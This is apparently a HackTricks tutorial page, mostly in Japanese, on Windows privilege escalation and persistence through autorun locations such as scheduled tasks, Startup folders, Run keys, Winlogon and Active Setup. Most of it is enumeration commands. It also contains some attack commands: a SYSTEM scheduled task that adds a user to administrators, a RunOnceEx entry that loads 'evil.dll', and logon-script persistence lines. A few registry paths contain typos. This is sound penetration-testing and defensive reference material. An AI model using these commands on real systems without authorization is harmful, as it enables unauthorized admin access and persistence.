# Autoruns を使った権限昇格

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** は **startup** 時にプログラムを実行するために使えます。startup で実行されるように設定されているバイナリを確認するには、次を使います:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Scheduled Tasks

**Tasks** は **一定の頻度** で実行するようにスケジュールできます。どの binaries が実行予定かを確認するには、次を使います:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## フォルダ

**Startup folders** にあるすべてのバイナリは、起動時に実行されます。一般的な startup folders は以下に示すものですが、startup folder はレジストリで指定されています。[場所を確認するにはこれを読んでください。](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* vulnerabilities (such as the one abused in WinRAR prior to 7.13 – CVE-2025-8088) can be leveraged to **deposit payloads directly inside these Startup folders during decompression**, resulting in code execution on the next user logon.  For a deep-dive into this technique see:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): The **Wow6432Node** registry entry indicates that you are running a 64-bit Windows version. The operating system uses this key to display a separate view of HKEY_LOCAL_MACHINE\SOFTWARE for 32-bit applications that run on 64-bit Windows versions.

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry keys known as **Run** and **RunOnce** are designed to automatically execute programs every time a user logs into the system. The command line assigned as a key's data value is limited to 260 characters or less.

**Service runs** (can control automatic startup of services during boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista 以降では、**Run** と **RunOnce** の registry keys は自動生成されません。これらのキーのエントリは、プログラムを直接起動することも、依存関係として指定することもできます。たとえば、ログオン時に DLL file を読み込むには、**RunOnceEx** registry key と "Depend" key を組み合わせて使用できます。これは、システム起動時に "C:\temp\evil.dll" を実行する registry entry を追加することで示されます:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: **HKLM** 内の言及された任意の registry に書き込める場合、別の user がログインしたときに権限昇格できます。

> [!TIP]
> **Exploit 2**: **HKLM** 内の任意の registry に示された binaries のいずれかを上書きできる場合、別の user がログインしたときにその binary を backdoor 付きに改変して権限昇格できます。
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** フォルダに置かれたショートカットは、ユーザーのログオン時またはシステム再起動時に、サービスやアプリケーションの起動を自動的にトリガーします。**Startup** フォルダの場所は、**Local Machine** と **Current User** の両スコープについてレジストリで定義されています。つまり、これらの指定された **Startup** の場所に追加されたショートカットは、リンク先のサービスやプログラムがログオンまたは再起動の処理後に起動することを保証し、プログラムを自動実行するための簡単な方法になります。

> [!TIP]
> **HKLM** 配下の任意の \[User] Shell Folder を上書きできるなら、それを自分が制御するフォルダに向け、システムにログインするたびに実行される backdoor を配置して、権限を昇格できます。
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

このユーザーごとのレジストリ値は、そのユーザーがログオンしたときに実行されるスクリプトやコマンドを指すことができます。主に **persistence** の手法ですが、影響を受けるユーザーのコンテキストでしか実行されないためです。それでも、post-exploitation や autoruns の確認時にはチェックする価値があります。

> [!TIP]
> 現在のユーザーに対してこの値を書き込めるなら、admin 権限なしで次回の対話的ログオン時に再度実行を引き起こせます。別のユーザー hive に書き込めるなら、そのユーザーがログオンしたときに code execution を得られる可能性があります。
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notes:

- `.bat`、`.cmd`、`.ps1`、または対象ユーザーが既に読み取り可能な他の launcher file へのフルパスを優先する。
- これは値が削除されるまで logoff/reboot をまたいで持続する。
- `HKLM\...\Run` とは異なり、これはそれ自体では elevation を与えない。これは user-scope persistence である。

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

通常、**Userinit** key は **userinit.exe** に設定されている。しかし、この key が変更されると、指定された executable もユーザー logon 時に **Winlogon** によって起動される。同様に、**Shell** key は **explorer.exe** を指すように設計されており、これは Windows の default shell である。
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> レジストリ値または binary を上書きできれば、権限昇格できます。

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** key を確認してください。
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Safe Mode Command Prompt の変更

Windows Registry の `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` には、デフォルトで `cmd.exe` に設定された **`AlternateShell`** 値があります。つまり、起動時に「Safe Mode with Command Prompt」を選ぶ（F8 を押す）と、`cmd.exe` が使われます。ただし、F8 を押して手動で選ばなくても、このモードで自動的に起動するようにコンピュータを設定することも可能です。

"Safe Mode with Command Prompt" で自動的に起動する boot option を作成する手順:

1. `boot.ini` ファイルの属性を変更して、read-only、system、hidden フラグを削除する: `attrib c:\boot.ini -r -s -h`
2. 編集のために `boot.ini` を開く。
3. 次のような行を挿入する: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` の変更を保存する。
5. 元のファイル属性を再適用する: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** registry key を変更すると、custom command shell の設定が可能になり、unauthorized access につながる可能性があります。
- **Exploit 2 (PATH Write Permissions):** system **PATH** variable の任意の場所、特に `C:\Windows\system32` より前に write permissions があると、custom `cmd.exe` を実行でき、システムが Safe Mode で起動された場合に backdoor として使える可能性があります。
- **Exploit 3 (PATH and boot.ini Write Permissions):** `boot.ini` への書き込み権限があると、自動的な Safe Mode 起動が可能になり、次回再起動時の unauthorized access を容易にします。

現在の **AlternateShell** 設定を確認するには、次のコマンドを使用します:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup は、**デスクトップ環境が完全に読み込まれる前に開始する** Windows の機能です。ユーザーログオンが進む前に完了しなければならない特定のコマンドの実行を優先します。この処理は、Run や RunOnce のレジストリ項目など、他の起動エントリがトリガーされるよりも前に行われます。

Active Setup は次のレジストリキーで管理されます:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

これらのキー内には複数のサブキーがあり、それぞれが特定のコンポーネントに対応します。特に注目すべきキー値は次のとおりです:

- **IsInstalled:**
- `0` は、そのコンポーネントのコマンドが実行されないことを示します。
- `1` は、そのコマンドが各ユーザーごとに1回実行されることを意味し、`IsInstalled` 値が存在しない場合の既定の動作です。
- **StubPath:** Active Setup によって実行されるコマンドを定義します。`notepad` の起動のような、有効なコマンドラインであれば何でもかまいません。

**Security Insights:**

- **`IsInstalled`** が `"1"` に設定され、特定の **`StubPath`** を持つキーを変更または書き込むと、不正なコマンド実行につながり、権限昇格に悪用される可能性があります。
- 任意の **`StubPath`** 値で参照されるバイナリファイルを変更することでも、十分な権限があれば権限昇格を達成できます。

To inspect the **`StubPath`** configurations across Active Setup components, these commands can be used:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Browser Helper Objects (BHOs) の概要

Browser Helper Objects (BHOs) は、Microsoft Internet Explorer に追加機能を与える DLL モジュールです。これらは起動時に Internet Explorer と Windows Explorer に読み込まれます。ただし、**NoExplorer** キーを 1 に設定すると実行をブロックでき、Windows Explorer のインスタンスで読み込まれなくなります。

BHOs は Internet Explorer 11 を介して Windows 10 でも互換性がありますが、Windows の新しいバージョンにおける既定ブラウザである Microsoft Edge ではサポートされていません。

システム上で登録されている BHOs を確認するには、次の registry keys を調べます:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

各 BHO は registry 内で **CLSID** によって表され、これは一意の識別子として機能します。各 CLSID の詳細情報は `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` で確認できます。

registry で BHOs を問い合わせるには、次のコマンドを利用できます:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

レジストリには、各 dll ごとに 1 つの新しいレジストリが含まれ、**CLSID** で表されることに注意してください。CLSID 情報は `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` で見つけることができます

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

autoruns を見つけられるすべての場所は、**すでに** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) によって**検索済み**であることに注意してください。ただし、**自動実行される**ファイルのより包括的な一覧が必要な場合は、systinternals の [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) を使えます:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## More

**より多くの Autoruns のような registry を見つけるには** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
